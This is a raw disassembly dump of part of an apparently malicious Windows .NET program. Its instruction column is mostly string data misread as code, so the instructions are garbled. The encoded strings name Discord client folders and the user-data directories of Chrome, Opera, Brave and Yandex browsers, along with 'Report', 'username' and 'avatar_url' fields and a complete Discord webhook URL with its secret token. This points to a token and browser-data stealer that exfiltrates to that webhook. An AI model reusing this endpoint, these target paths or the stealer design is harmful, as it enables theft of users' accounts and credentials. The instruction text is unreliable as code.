  40312a:	52                   	push   %edx
  40312b:	00 6f 00             	add    %ch,0x0(%edi)
  40312e:	61                   	popa
  40312f:	00 6d 00             	add    %ch,0x0(%ebp)
  403132:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  403138:	5c                   	pop    %esp
  403139:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  40313d:	00 73 00             	add    %dh,0x0(%ebx)
  403140:	63 00                	arpl   %eax,(%eax)
  403142:	6f                   	outsl  %ds:(%esi),(%dx)
  403143:	00 72 00             	add    %dh,0x0(%edx)
  403146:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  40314a:	61                   	popa
  40314b:	00 6e 00             	add    %ch,0x0(%esi)
  40314e:	61                   	popa
  40314f:	00 72 00             	add    %dh,0x0(%edx)
  403152:	79 00                	jns    0x403154
  403154:	00 17                	add    %dl,(%edi)
  403156:	44                   	inc    %esp
  403157:	00 69 00             	add    %ch,0x0(%ecx)
  40315a:	73 00                	jae    0x40315c
  40315c:	63 00                	arpl   %eax,(%eax)
  40315e:	6f                   	outsl  %ds:(%esi),(%dx)
  40315f:	00 72 00             	add    %dh,0x0(%edx)
  403162:	64 00 20             	add    %ah,%fs:(%eax)
  403165:	00 50 00             	add    %dl,0x0(%eax)
  403168:	54                   	push   %esp
  403169:	00 42 00             	add    %al,0x0(%edx)
  40316c:	00 25 52 00 6f 00    	add    %ah,0x6f0052
  403172:	61                   	popa
  403173:	00 6d 00             	add    %ch,0x0(%ebp)
  403176:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40317c:	5c                   	pop    %esp
  40317d:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  403181:	00 73 00             	add    %dh,0x0(%ebx)
  403184:	63 00                	arpl   %eax,(%eax)
  403186:	6f                   	outsl  %ds:(%esi),(%dx)
  403187:	00 72 00             	add    %dh,0x0(%edx)
  40318a:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  40318e:	74 00                	je     0x403190
  403190:	62 00                	bound  %eax,(%eax)
  403192:	00 1b                	add    %bl,(%ebx)
  403194:	47                   	inc    %edi
  403195:	00 6f 00             	add    %ch,0x0(%edi)
  403198:	6f                   	outsl  %ds:(%esi),(%dx)
  403199:	00 67 00             	add    %ah,0x0(%edi)
  40319c:	6c                   	insb   (%dx),%es:(%edi)
  40319d:	00 65 00             	add    %ah,0x0(%ebp)
  4031a0:	20 00                	and    %al,(%eax)
  4031a2:	43                   	inc    %ebx
  4031a3:	00 68 00             	add    %ch,0x0(%eax)
  4031a6:	72 00                	jb     0x4031a8
  4031a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4031a9:	00 6d 00             	add    %ch,0x0(%ebp)
  4031ac:	65 00 00             	add    %al,%gs:(%eax)
  4031af:	4b                   	dec    %ebx
  4031b0:	4c                   	dec    %esp
  4031b1:	00 6f 00             	add    %ch,0x0(%edi)
  4031b4:	63 00                	arpl   %eax,(%eax)
  4031b6:	61                   	popa
  4031b7:	00 6c 00 5c          	add    %ch,0x5c(%eax,%eax,1)
  4031bb:	00 47 00             	add    %al,0x0(%edi)
  4031be:	6f                   	outsl  %ds:(%esi),(%dx)
  4031bf:	00 6f 00             	add    %ch,0x0(%edi)
  4031c2:	67 00 6c 00          	add    %ch,0x0(%si)
  4031c6:	65 00 5c 00 43       	add    %bl,%gs:0x43(%eax,%eax,1)
  4031cb:	00 68 00             	add    %ch,0x0(%eax)
  4031ce:	72 00                	jb     0x4031d0
  4031d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4031d1:	00 6d 00             	add    %ch,0x0(%ebp)
  4031d4:	65 00 5c 00 55       	add    %bl,%gs:0x55(%eax,%eax,1)
  4031d9:	00 73 00             	add    %dh,0x0(%ebx)
  4031dc:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4031e0:	20 00                	and    %al,(%eax)
  4031e2:	44                   	inc    %esp
  4031e3:	00 61 00             	add    %ah,0x0(%ecx)
  4031e6:	74 00                	je     0x4031e8
  4031e8:	61                   	popa
  4031e9:	00 5c 00 44          	add    %bl,0x44(%eax,%eax,1)
  4031ed:	00 65 00             	add    %ah,0x0(%ebp)
  4031f0:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  4031f4:	75 00                	jne    0x4031f6
  4031f6:	6c                   	insb   (%dx),%es:(%edi)
  4031f7:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  4031fb:	0b 4f 00             	or     0x0(%edi),%ecx
  4031fe:	70 00                	jo     0x403200
  403200:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403204:	61                   	popa
  403205:	00 00                	add    %al,(%eax)
  403207:	47                   	inc    %edi
  403208:	52                   	push   %edx
  403209:	00 6f 00             	add    %ch,0x0(%edi)
  40320c:	61                   	popa
  40320d:	00 6d 00             	add    %ch,0x0(%ebp)
  403210:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  403216:	5c                   	pop    %esp
  403217:	00 4f 00             	add    %cl,0x0(%edi)
  40321a:	70 00                	jo     0x40321c
  40321c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403220:	61                   	popa
  403221:	00 20                	add    %ah,(%eax)
  403223:	00 53 00             	add    %dl,0x0(%ebx)
  403226:	6f                   	outsl  %ds:(%esi),(%dx)
  403227:	00 66 00             	add    %ah,0x0(%esi)
  40322a:	74 00                	je     0x40322c
  40322c:	77 00                	ja     0x40322e
  40322e:	61                   	popa
  40322f:	00 72 00             	add    %dh,0x0(%edx)
  403232:	65 00 5c 00 4f       	add    %bl,%gs:0x4f(%eax,%eax,1)
  403237:	00 70 00             	add    %dh,0x0(%eax)
  40323a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40323e:	61                   	popa
  40323f:	00 20                	add    %ah,(%eax)
  403241:	00 53 00             	add    %dl,0x0(%ebx)
  403244:	74 00                	je     0x403246
  403246:	61                   	popa
  403247:	00 62 00             	add    %ah,0x0(%edx)
  40324a:	6c                   	insb   (%dx),%es:(%edi)
  40324b:	00 65 00             	add    %ah,0x0(%ebp)
  40324e:	00 0b                	add    %cl,(%ebx)
  403250:	42                   	inc    %edx
  403251:	00 72 00             	add    %dh,0x0(%edx)
  403254:	61                   	popa
  403255:	00 76 00             	add    %dh,0x0(%esi)
  403258:	65 00 00             	add    %al,%gs:(%eax)
  40325b:	67 4c                	addr16 dec %esp
  40325d:	00 6f 00             	add    %ch,0x0(%edi)
  403260:	63 00                	arpl   %eax,(%eax)
  403262:	61                   	popa
  403263:	00 6c 00 5c          	add    %ch,0x5c(%eax,%eax,1)
  403267:	00 42 00             	add    %al,0x0(%edx)
  40326a:	72 00                	jb     0x40326c
  40326c:	61                   	popa
  40326d:	00 76 00             	add    %dh,0x0(%esi)
  403270:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  403274:	6f                   	outsl  %ds:(%esi),(%dx)
  403275:	00 66 00             	add    %ah,0x0(%esi)
  403278:	74 00                	je     0x40327a
  40327a:	77 00                	ja     0x40327c
  40327c:	61                   	popa
  40327d:	00 72 00             	add    %dh,0x0(%edx)
  403280:	65 00 5c 00 42       	add    %bl,%gs:0x42(%eax,%eax,1)
  403285:	00 72 00             	add    %dh,0x0(%edx)
  403288:	61                   	popa
  403289:	00 76 00             	add    %dh,0x0(%esi)
  40328c:	65 00 2d 00 42 00 72 	add    %ch,%gs:0x72004200
  403293:	00 6f 00             	add    %ch,0x0(%edi)
  403296:	77 00                	ja     0x403298
  403298:	73 00                	jae    0x40329a
  40329a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40329e:	5c                   	pop    %esp
  40329f:	00 55 00             	add    %dl,0x0(%ebp)
  4032a2:	73 00                	jae    0x4032a4
  4032a4:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4032a8:	20 00                	and    %al,(%eax)
  4032aa:	44                   	inc    %esp
  4032ab:	00 61 00             	add    %ah,0x0(%ecx)
  4032ae:	74 00                	je     0x4032b0
  4032b0:	61                   	popa
  4032b1:	00 5c 00 44          	add    %bl,0x44(%eax,%eax,1)
  4032b5:	00 65 00             	add    %ah,0x0(%ebp)
  4032b8:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  4032bc:	75 00                	jne    0x4032be
  4032be:	6c                   	insb   (%dx),%es:(%edi)
  4032bf:	00 74 00 01          	add    %dh,0x1(%eax,%eax,1)
  4032c3:	0d 59 00 61 00       	or     $0x610059,%eax
  4032c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4032c9:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4032cd:	00 78 00             	add    %bh,0x0(%eax)
  4032d0:	00 59 4c             	add    %bl,0x4c(%ecx)
  4032d3:	00 6f 00             	add    %ch,0x0(%edi)
  4032d6:	63 00                	arpl   %eax,(%eax)
  4032d8:	61                   	popa
  4032d9:	00 6c 00 5c          	add    %ch,0x5c(%eax,%eax,1)
  4032dd:	00 59 00             	add    %bl,0x0(%ecx)
  4032e0:	61                   	popa
  4032e1:	00 6e 00             	add    %ch,0x0(%esi)
  4032e4:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4032e8:	78 00                	js     0x4032ea
  4032ea:	5c                   	pop    %esp
  4032eb:	00 59 00             	add    %bl,0x0(%ecx)
  4032ee:	61                   	popa
  4032ef:	00 6e 00             	add    %ch,0x0(%esi)
  4032f2:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4032f6:	78 00                	js     0x4032f8
  4032f8:	42                   	inc    %edx
  4032f9:	00 72 00             	add    %dh,0x0(%edx)
  4032fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4032fd:	00 77 00             	add    %dh,0x0(%edi)
  403300:	73 00                	jae    0x403302
  403302:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403306:	5c                   	pop    %esp
  403307:	00 55 00             	add    %dl,0x0(%ebp)
  40330a:	73 00                	jae    0x40330c
  40330c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403310:	20 00                	and    %al,(%eax)
  403312:	44                   	inc    %esp
  403313:	00 61 00             	add    %ah,0x0(%ecx)
  403316:	74 00                	je     0x403318
  403318:	61                   	popa
  403319:	00 5c 00 44          	add    %bl,0x44(%eax,%eax,1)
  40331d:	00 65 00             	add    %ah,0x0(%ebp)
  403320:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  403324:	75 00                	jne    0x403326
  403326:	6c                   	insb   (%dx),%es:(%edi)
  403327:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40332b:	07                   	pop    %es
  40332c:	0a 00                	or     (%eax),%al
  40332e:	2a 00                	sub    (%eax),%al
  403330:	2a 00                	sub    (%eax),%al
  403332:	00 05 2a 00 2a 00    	add    %al,0x2a002a
  403338:	00 0f                	add    %cl,(%edi)
  40333a:	63 00                	arpl   %eax,(%eax)
  40333c:	6f                   	outsl  %ds:(%esi),(%dx)
  40333d:	00 6e 00             	add    %ch,0x0(%esi)
  403340:	74 00                	je     0x403342
  403342:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  403346:	74 00                	je     0x403348
  403348:	00 21                	add    %ah,(%ecx)
  40334a:	2a 00                	sub    (%eax),%al
  40334c:	2a 00                	sub    (%eax),%al
  40334e:	52                   	push   %edx
  40334f:	00 65 00             	add    %ah,0x0(%ebp)
  403352:	70 00                	jo     0x403354
  403354:	6f                   	outsl  %ds:(%esi),(%dx)
  403355:	00 72 00             	add    %dh,0x0(%edx)
  403358:	74 00                	je     0x40335a
  40335a:	2a 00                	sub    (%eax),%al
  40335c:	2a 00                	sub    (%eax),%al
  40335e:	20 00                	and    %al,(%eax)
  403360:	3a 00                	cmp    (%eax),%al
  403362:	20 00                	and    %al,(%eax)
  403364:	27                   	daa
  403365:	00 2a                	add    %ch,(%edx)
  403367:	00 2a                	add    %ch,(%edx)
  403369:	00 01                	add    %al,(%ecx)
  40336b:	07                   	pop    %es
  40336c:	27                   	daa
  40336d:	00 0a                	add    %cl,(%edx)
  40336f:	00 0a                	add    %cl,(%edx)
  403371:	00 01                	add    %al,(%ecx)
  403373:	03 0a                	add    (%edx),%ecx
  403375:	00 00                	add    %al,(%eax)
  403377:	11 75 00             	adc    %esi,0x0(%ebp)
  40337a:	73 00                	jae    0x40337c
  40337c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403380:	6e                   	outsb  %ds:(%esi),(%dx)
  403381:	00 61 00             	add    %ah,0x0(%ecx)
  403384:	6d                   	insl   (%dx),%es:(%edi)
  403385:	00 65 00             	add    %ah,0x0(%ebp)
  403388:	00 13                	add    %dl,(%ebx)
  40338a:	34 ff                	xor    $0xff,%al
  40338c:	25 ff 21 ff 2d       	and    $0x2dff21ff,%eax
  403391:	ff 20                	jmp    *(%eax)
  403393:	00 22                	add    %ah,(%edx)
  403395:	ff 2c ff             	ljmp   *(%edi,%edi,8)
  403398:	35 ff 25 ff 01       	xor    $0x1ff25ff,%eax
  40339d:	15 61 00 76 00       	adc    $0x760061,%eax
  4033a2:	61                   	popa
  4033a3:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  4033a7:	00 72 00             	add    %dh,0x0(%edx)
  4033aa:	5f                   	pop    %edi
  4033ab:	00 75 00             	add    %dh,0x0(%ebp)
  4033ae:	72 00                	jb     0x4033b0
  4033b0:	6c                   	insb   (%dx),%es:(%edi)
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	80 bf 68 00 74 00 74 	cmpb   $0x74,0x740068(%edi)
  4033ba:	00 70 00             	add    %dh,0x0(%eax)
  4033bd:	73 00                	jae    0x4033bf
  4033bf:	3a 00                	cmp    (%eax),%al
  4033c1:	2f                   	das
  4033c2:	00 2f                	add    %ch,(%edi)
  4033c4:	00 36                	add    %dh,(%esi)
  4033c6:	00 36                	add    %dh,(%esi)
  4033c8:	00 2e                	add    %ch,(%esi)
  4033ca:	00 6d 00             	add    %ch,0x0(%ebp)
  4033cd:	65 00 64 00 69       	add    %ah,%gs:0x69(%eax,%eax,1)
  4033d2:	00 61 00             	add    %ah,0x0(%ecx)
  4033d5:	2e 00 74 00 75       	add    %dh,%cs:0x75(%eax,%eax,1)
  4033da:	00 6d 00             	add    %ch,0x0(%ebp)
  4033dd:	62 00                	bound  %eax,(%eax)
  4033df:	6c                   	insb   (%dx),%es:(%edi)
  4033e0:	00 72 00             	add    %dh,0x0(%edx)
  4033e3:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  4033e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4033e8:	00 6d 00             	add    %ch,0x0(%ebp)
  4033eb:	2f                   	das
  4033ec:	00 37                	add    %dh,(%edi)
  4033ee:	00 32                	add    %dh,(%edx)
  4033f0:	00 61 00             	add    %ah,0x0(%ecx)
  4033f3:	30 00                	xor    %al,(%eax)
  4033f5:	31 00                	xor    %eax,(%eax)
  4033f7:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  4033fb:	63 00                	arpl   %eax,(%eax)
  4033fd:	31 00                	xor    %eax,(%eax)
  4033ff:	37                   	aaa
  403400:	00 35 00 36 00 36    	add    %dh,0x36003600
  403406:	00 37                	add    %dh,(%edi)
  403408:	00 33                	add    %dh,(%ebx)
  40340a:	00 66 00             	add    %ah,0x0(%esi)
  40340d:	38 00                	cmp    %al,(%eax)
  40340f:	61                   	popa
  403410:	00 65 00             	add    %ah,0x0(%ebp)
  403413:	35 00 34 00 63       	xor    $0x63003400,%eax
  403418:	00 39                	add    %bh,(%ecx)
  40341a:	00 35 00 63 00 65    	add    %dh,0x65006300
  403420:	00 38                	add    %bh,(%eax)
  403422:	00 63 00             	add    %ah,0x0(%ebx)
  403425:	34 00                	xor    $0x0,%al
  403427:	62 00                	bound  %eax,(%eax)
  403429:	31 00                	xor    %eax,(%eax)
  40342b:	34 00                	xor    $0x0,%al
  40342d:	2f                   	das
  40342e:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  403432:	00 6d 00             	add    %ch,0x0(%ebp)
  403435:	62 00                	bound  %eax,(%eax)
  403437:	6c                   	insb   (%dx),%es:(%edi)
  403438:	00 72 00             	add    %dh,0x0(%edx)
  40343b:	5f                   	pop    %edi
  40343c:	00 6f 00             	add    %ch,0x0(%edi)
  40343f:	74 00                	je     0x403441
  403441:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  403445:	71 00                	jno    0x403447
  403447:	6f                   	outsl  %ds:(%esi),(%dx)
  403448:	00 41 00             	add    %al,0x0(%ecx)
  40344b:	4b                   	dec    %ebx
  40344c:	00 44 00 36          	add    %al,0x36(%eax,%eax,1)
  403450:	00 31                	add    %dh,(%ecx)
  403452:	00 76 00             	add    %dh,0x0(%esi)
  403455:	63 00                	arpl   %eax,(%eax)
  403457:	37                   	aaa
  403458:	00 36                	add    %dh,(%esi)
  40345a:	00 6e 00             	add    %ch,0x0(%esi)
  40345d:	76 00                	jbe    0x40345f
  40345f:	6f                   	outsl  %ds:(%esi),(%dx)
  403460:	00 31                	add    %dh,(%ecx)
  403462:	00 5f 00             	add    %bl,0x0(%edi)
  403465:	34 00                	xor    $0x0,%al
  403467:	30 00                	xor    %al,(%eax)
  403469:	30 00                	xor    %al,(%eax)
  40346b:	2e 00 6a 00          	add    %ch,%cs:0x0(%edx)
  40346f:	70 00                	jo     0x403471
  403471:	67 00 00             	add    %al,(%bx,%si)
  403474:	80 f7 68             	xor    $0x68,%bh
  403477:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40347b:	00 70 00             	add    %dh,0x0(%eax)
  40347e:	73 00                	jae    0x403480
  403480:	3a 00                	cmp    (%eax),%al
  403482:	2f                   	das
  403483:	00 2f                	add    %ch,(%edi)
  403485:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  403489:	00 73 00             	add    %dh,0x0(%ebx)
  40348c:	63 00                	arpl   %eax,(%eax)
  40348e:	6f                   	outsl  %ds:(%esi),(%dx)
  40348f:	00 72 00             	add    %dh,0x0(%edx)
  403492:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  403496:	70 00                	jo     0x403498
  403498:	70 00                	jo     0x40349a
  40349a:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40349e:	6f                   	outsl  %ds:(%esi),(%dx)
  40349f:	00 6d 00             	add    %ch,0x0(%ebp)
  4034a2:	2f                   	das
  4034a3:	00 61 00             	add    %ah,0x0(%ecx)
  4034a6:	70 00                	jo     0x4034a8
  4034a8:	69 00 2f 00 77 00    	imul   $0x77002f,(%eax),%eax
  4034ae:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  4034b2:	68 00 6f 00 6f       	push   $0x6f006f00
  4034b7:	00 6b 00             	add    %ch,0x0(%ebx)
  4034ba:	73 00                	jae    0x4034bc
  4034bc:	2f                   	das
  4034bd:	00 36                	add    %dh,(%esi)
  4034bf:	00 36                	add    %dh,(%esi)
  4034c1:	00 38                	add    %bh,(%eax)
  4034c3:	00 38                	add    %bh,(%eax)
  4034c5:	00 36                	add    %dh,(%esi)
  4034c7:	00 36                	add    %dh,(%esi)
  4034c9:	00 31                	add    %dh,(%ecx)
  4034cb:	00 31                	add    %dh,(%ecx)
  4034cd:	00 35 00 39 00 30    	add    %dh,0x30003900
  4034d3:	00 38                	add    %bh,(%eax)
  4034d5:	00 32                	add    %dh,(%edx)
  4034d7:	00 37                	add    %dh,(%edi)
  4034d9:	00 32                	add    %dh,(%edx)
  4034db:	00 31                	add    %dh,(%ecx)
  4034dd:	00 33                	add    %dh,(%ebx)
  4034df:	00 39                	add    %bh,(%ecx)
  4034e1:	00 2f                	add    %ch,(%edi)
  4034e3:	00 46 00             	add    %al,0x0(%esi)
  4034e6:	5a                   	pop    %edx
  4034e7:	00 51 00             	add    %dl,0x0(%ecx)
  4034ea:	31 00                	xor    %eax,(%eax)
  4034ec:	63 00                	arpl   %eax,(%eax)
  4034ee:	4d                   	dec    %ebp
  4034ef:	00 48 00             	add    %cl,0x0(%eax)
  4034f2:	6b 00 52             	imul   $0x52,(%eax),%eax
  4034f5:	00 50 00             	add    %dl,0x0(%eax)
  4034f8:	70 00                	jo     0x4034fa
  4034fa:	58                   	pop    %eax
  4034fb:	00 30                	add    %dh,(%eax)
  4034fd:	00 53 00             	add    %dl,0x0(%ebx)
  403500:	35 00 47 00 32       	xor    $0x32004700,%eax
  403505:	00 58 00             	add    %bl,0x0(%eax)
  403508:	74 00                	je     0x40350a
  40350a:	42                   	inc    %edx
  40350b:	00 56 00             	add    %dl,0x0(%esi)
  40350e:	76 00                	jbe    0x403510
  403510:	61                   	popa
  403511:	00 62 00             	add    %ah,0x0(%edx)
  403514:	54                   	push   %esp
  403515:	00 54 00 35          	add    %dl,0x35(%eax,%eax,1)
  403519:	00 33                	add    %dh,(%ebx)
  40351b:	00 72 00             	add    %dh,0x0(%edx)
  40351e:	30 00                	xor    %al,(%eax)
  403520:	4d                   	dec    %ebp
  403521:	00 39                	add    %bh,(%ecx)
  403523:	00 5f 00             	add    %bl,0x0(%edi)
  403526:	7a 00                	jp     0x403528
  403528:	2d 00 6d 00 35       	sub    $0x35006d00,%eax
  40352d:	00 6c 00 6a          	add    %ch,0x6a(%eax,%eax,1)
  403531:	00 6d 00             	add    %ch,0x0(%ebp)
  403534:	68 00 4b 00 73       	push   $0x73004b00
  403539:	00 68 00             	add    %ch,0x0(%eax)
  40353c:	7a 00                	jp     0x40353e
  40353e:	59                   	pop    %ecx
  40353f:	00 4b 00             	add    %cl,0x0(%ebx)
  403542:	37                   	aaa
  403543:	00 39                	add    %bh,(%ecx)
  403545:	00 4c 00 63          	add    %cl,0x63(%eax,%eax,1)
  403549:	00 57 00             	add    %dl,0x0(%edi)
  40354c:	61                   	popa
  40354d:	00 4b 00             	add    %cl,0x0(%ebx)
  403550:	4e                   	dec    %esi
  403551:	00 48 00             	add    %cl,0x0(%eax)
  403554:	58                   	pop    %eax
  403555:	00 45 00             	add    %al,0x0(%ebp)
  403558:	37                   	aaa
  403559:	00 48 00             	add    %cl,0x0(%eax)
  40355c:	33 00                	xor    (%eax),%eax
  40355e:	52                   	push   %edx
  40355f:	00 7a 00             	add    %bh,0x0(%edx)
  403562:	33 00                	xor    (%eax),%eax
  403564:	6e                   	outsb  %ds:(%esi),(%dx)
  403565:	00 66 00             	add    %ah,0x0(%esi)
  403568:	6b 00 37             	imul   $0x37,(%eax),%eax
  40356b:	00 01                	add    %al,(%ecx)
  40356d:	00 00                	add    %al,(%eax)
  40356f:	00 61 23             	add    %ah,0x23(%ecx)
  403572:	db 0b                	fisttpl (%ebx)
  403574:	a2 31 75 4e 8e       	mov    %al,0x8e4e7531
  403579:	5d                   	pop    %ebp
  40357a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40357b:	6f                   	outsl  %ds:(%esi),(%dx)
  40357c:	78 f2                	js     0x403570
  40357e:	94                   	xchg   %eax,%esp
  40357f:	a0 00 04 20 01       	mov    0x1200400,%al
  403584:	01 08                	add    %ecx,(%eax)
  403586:	03 20                	add    (%eax),%esp
  403588:	00 01                	add    %al,(%ecx)
  40358a:	05 20 01 01 11       	add    $0x11010120,%eax
  40358f:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  403592:	01 01                	add    %eax,(%ecx)
  403594:	0e                   	push   %cs
  403595:	04 20                	add    $0x20,%al
  403597:	01 01                	add    %eax,(%ecx)
  403599:	02 05 20 01 01 11    	add    0x11010120,%al
  40359f:	49                   	dec    %ecx
  4035a0:	26 07                	es pop %es
  4035a2:	0f 12 55 15          	movlps 0x15(%ebp),%xmm2
  4035a6:	12 51 01             	adc    0x1(%ecx),%dl
  4035a9:	0e                   	push   %cs
  4035aa:	1d 12 59 08 12       	sbb    $0x12085912,%eax
  4035af:	59                   	pop    %ecx
  4035b0:	0e                   	push   %cs
  4035b1:	12 5d 12             	adc    0x12(%ebp),%bl
  4035b4:	61                   	popa
  4035b5:	12 65 12             	adc    0x12(%ebp),%ah
  4035b8:	5d                   	pop    %ebp
  4035b9:	12 61 02             	adc    0x2(%ecx),%ah
  4035bc:	15 12 51 01 0e       	adc    $0xe015112,%eax
  4035c1:	08 15 12 51 01 0e    	or     %dl,0xe015112
  4035c7:	06                   	push   %es
  4035c8:	00 01                	add    %al,(%ecx)
  4035ca:	0e                   	push   %cs
  4035cb:	11 80 81 07 00 04    	adc    %eax,0x4000781(%eax)
  4035d1:	0e                   	push   %cs
  4035d2:	0e                   	push   %cs
  4035d3:	0e                   	push   %cs
  4035d4:	0e                   	push   %cs
  4035d5:	0e                   	push   %cs
  4035d6:	05 15 12 51 01       	add    $0x1511215,%eax
  4035db:	0e                   	push   %cs
  4035dc:	06                   	push   %es
  4035dd:	20 01                	and    %al,(%ecx)
  4035df:	1d 12 59 0e 05       	sbb    $0x50e5912,%eax
  4035e4:	20 00                	and    %al,(%eax)
  4035e6:	12 80 89 03 20 00    	adc    0x200389(%eax),%al
  4035ec:	0e                   	push   %cs
  4035ed:	07                   	pop    %es
  4035ee:	00 02                	add    %al,(%edx)
  4035f0:	12 80 95 0e 0e 04    	adc    0x40e0e95(%eax),%al
  4035f6:	20 00                	and    %al,(%eax)
  4035f8:	12 5d 03             	adc    0x3(%ebp),%bl
  4035fb:	20 00                	and    %al,(%eax)
  4035fd:	1c 05                	sbb    $0x5,%al
  4035ff:	20 01                	and    %al,(%ecx)
  403601:	01 13                	add    %edx,(%ebx)
  403603:	00 03                	add    %al,(%ebx)
  403605:	20 00                	and    %al,(%eax)
  403607:	02 11                	add    (%ecx),%dl
  403609:	10 01                	adc    %al,(%ecx)
  40360b:	01 15 12 80 a1 01    	add    %edx,0x1a18012
  403611:	1e                   	push   %ds
  403612:	00 15 12 80 a1 01    	add    %dl,0x1a18012
  403618:	1e                   	push   %ds
  403619:	00 03                	add    %al,(%ebx)
  40361b:	0a 01                	or     (%ecx),%al
  40361d:	0e                   	push   %cs
  40361e:	10 10                	adc    %dl,(%eax)
  403620:	01 01                	add    %eax,(%ecx)
  403622:	15 12 51 01 1e       	adc    $0x1e015112,%eax
  403627:	00 15 12 80 a1 01    	add    %dl,0x1a18012
  40362d:	1e                   	push   %ds
  40362e:	00 03                	add    %al,(%ebx)
  403630:	20 00                	and    %al,(%eax)
  403632:	08 05 20 01 13 00    	or     %al,0x130120
  403638:	08 05 00 02 0e 0e    	or     %al,0xe0e0200
  40363e:	0e                   	push   %cs
  40363f:	06                   	push   %es
  403640:	20 02                	and    %al,(%edx)
  403642:	01 08                	add    %ecx,(%eax)
  403644:	13 00                	adc    (%eax),%eax
  403646:	0b 07                	or     (%edi),%eax
  403648:	03 15 11 69 01 12    	add    0x12016911,%edx
  40364e:	10 12                	adc    %dl,(%edx)
  403650:	10 02                	adc    %al,(%edx)
  403652:	06                   	push   %es
  403653:	15 12 51 01 12       	adc    $0x12015112,%eax
  403658:	10 08                	adc    %cl,(%eax)
  40365a:	20 00                	and    %al,(%eax)
  40365c:	15 11 69 01 13       	adc    $0x13016911,%eax
  403661:	00 06                	add    %al,(%esi)
  403663:	15 11 69 01 12       	adc    $0x12016911,%eax
  403668:	10 04 20             	adc    %al,(%eax,%eiz,1)
  40366b:	00 13                	add    %dl,(%ebx)
  40366d:	00 08                	add    %cl,(%eax)
  40366f:	07                   	pop    %es
  403670:	02 15 12 51 01 0e    	add    0xe015112,%dl
  403676:	02 06                	add    (%esi),%al
  403678:	00 03                	add    %al,(%ebx)
  40367a:	0e                   	push   %cs
  40367b:	0e                   	push   %cs
  40367c:	0e                   	push   %cs
  40367d:	0e                   	push   %cs
  40367e:	0a 20                	or     (%eax),%ah
  403680:	01 01                	add    %eax,(%ecx)
  403682:	15 12 80 a1 01       	adc    $0x1a18012,%eax
  403687:	13 00                	adc    (%eax),%eax
  403689:	16                   	push   %ss
  40368a:	07                   	pop    %es
  40368b:	04 12                	add    $0x12,%al
  40368d:	6d                   	insl   (%dx),%es:(%edi)
  40368e:	15 12 71 02 0e       	adc    $0xe027112,%eax
  403693:	0e                   	push   %cs
  403694:	15 12 71 02 0e       	adc    $0xe027112,%eax
  403699:	0e                   	push   %cs
  40369a:	15 11 75 01 12       	adc    $0x12017511,%eax
  40369f:	79 06                	jns    0x4036a7
  4036a1:	15 12 71 02 0e       	adc    $0xe027112,%eax
  4036a6:	0e                   	push   %cs
  4036a7:	03 00                	add    (%eax),%eax
  4036a9:	00 0e                	add    %cl,(%esi)
  4036ab:	0a 00                	or     (%eax),%al
  4036ad:	02 0e                	add    (%esi),%cl
  4036af:	0e                   	push   %cs
  4036b0:	15 12 80 a1 01       	adc    $0x1a18012,%eax
  4036b5:	0e                   	push   %cs
  4036b6:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  4036bb:	0e                   	push   %cs
  4036bc:	07                   	pop    %es
  4036bd:	20 02                	and    %al,(%edx)
  4036bf:	01 13                	add    %edx,(%ebx)
  4036c1:	00 13                	add    %dl,(%ebx)
  4036c3:	01 0f                	add    %ecx,(%edi)
  4036c5:	20 01                	and    %al,(%ecx)
  4036c7:	01 15 12 80 a1 01    	add    %edx,0x1a18012
  4036cd:	15 11 80 a9 02       	adc    $0x2a98011,%eax
  4036d2:	0e                   	push   %cs
  4036d3:	0e                   	push   %cs
  4036d4:	0d 20 02 15 12       	or     $0x12150220,%eax
  4036d9:	80 ad 01 12 79 0e 12 	subb   $0x12,0xe791201(%ebp)
  4036e0:	80 b1 07 15 12 80 ad 	xorb   $0xad,-0x7fedeaf9(%ecx)
  4036e7:	01 12                	add    %edx,(%edx)
  4036e9:	79 08                	jns    0x4036f3
  4036eb:	20 00                	and    %al,(%eax)
  4036ed:	15 11 75 01 13       	adc    $0x13017511,%eax
  4036f2:	00 06                	add    %al,(%esi)
  4036f4:	15 11 75 01 12       	adc    $0x12017511,%eax
